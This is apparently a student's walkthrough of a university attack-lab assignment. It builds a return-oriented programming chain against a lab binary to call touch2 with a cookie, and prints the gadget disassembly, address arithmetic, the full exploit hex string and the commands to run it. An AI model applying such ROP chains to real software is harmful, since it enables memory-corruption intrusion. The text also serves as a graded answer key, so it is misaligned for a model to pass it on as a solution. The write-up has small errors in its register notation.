Phase 4 is different from the previous 3 because on this target, we can't execute code for the following two reasons:
1. Stack randomization -- you can't simply point your injected code to a fixed address on the stack and run your explit code
2. Non-executeble memory block. This feature prevents you from executing instructions on the machine because the memory block is marked as non-executable.

The solution for this is to use ROP (Return Oriented Programming), what ROP does is that since we can't execute our own code, we will look for instructions
in the code that do the same thing as what we want. These are called gadgets and by combining these gadgets, we will be able to perform our exploit.

For this phase, we will be using the program rtarget instead of ctarget

This phase is the same as phase 2 except you are using different exploit method to call touch2 and pass your cookie.

In the pdf it tells you to find the instructions from the table and one of the instructions you will use involve popping rdi register off the stack,

`popq %rdi` is given in the the pdf and it's byte representation is `5f`, since we don't have 5f byte in the dump file, we will look for a substitute which
is `popq %rax% with byte representation of `58`

In your disassembled code, (objdump -d rtarget > rtarget_dump.txt), there are a lot of functions and the ones you can pick your instructions are located 
between start_farm and end_farm something like that. Now, search for 58 between those.

```
00000000004018ee <getval_336>:
4018ee:	b8 1b f3 8c 58       	mov    $0x588cf31b,%eax
4018f3:	c3                   	retq   
```

I found the above in the disassembled code and there might be more than one but take note of the address of 58, which will be used later.

The other instruction you need is: `movq %rax %edi` and it's byte representation is `48 89 c7 c3` which is referenced in the pdf. 
Go back to your disassembled code and search for that byte code.

I found:

```
0000000000401907 <setval_131>:
401907:	c7 07 48 89 c7 c3    	movl   $0xc3c78948,(%rdi)
40190d:	c3                   	retq   
```

Now you have 2 gadgets and can exploit the rtarget program.

The exploit we are doing is:

```
popq %rax
movq %rax %rdi
ret 
```

The next step is constructing your string, the format is padding for the buffer size, gadget 1 address, your cookie, gadget 2 address, return address
and finally touch2 address.

Becareful with the address of the gadgets, it starts at the byte code we are looking for not at the address where the function starts.

What I mean is that, look at the first gadget:
```
00000000004018ee <getval_336>:
4018ee:	b8 1b f3 8c 58       	mov    $0x588cf31b,%eax
4018f3:	c3                   	retq   
```
The address of the function starts at `4018ee` but 58 is present on the 5th byte, so we need to add 4 bytes to the address.
We just want the bytes starting at that address.

`4018ee + 4 = 4018f2`

Same thing with the second gadget: address starts at `401907` but `48 89 c7 c3` starts on the 3rd byte, so add 2 bytes to the address.

```
0000000000401907 <setval_131>:
401907:	c7 07 48 89 c7 c3    	movl   $0xc3c78948,(%rdi)
40190d:	c3                   	retq   
```

`401907 + 2 = 401909`

Now put everything together in a file named phase4.txt and here is my version:

```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 /* first 24(buffer size) bytes here are just padding */
f2 18 40 00 00 00 00 00 /* gadget 1: popq %rax address starts at last byte */
70 4b 4b 43 00 00 00 00 /* cookie */
09 19 40 00 00 00 00 00 /* gadget 2: move %rax to %rdi */
8c 17 40 00 00 00 00 00 /* touch2 address
```

Last step is to generate the raw eploit string using the hex2raw program.

`./hex2raw < phase4.txt > raw-phase4.txt`

Finally, you run the raw file (remember you are running it on rtarget, not ctarget)

`./rtarget < raw-phase4.txt`

You should get something like below:

```
Type string:Touch2!: You called touch2(0x434b4b70)
Valid solution for level 2 with target rtarget
PASS: Sent exploit string to server to be validated.
NICE JOB!
```

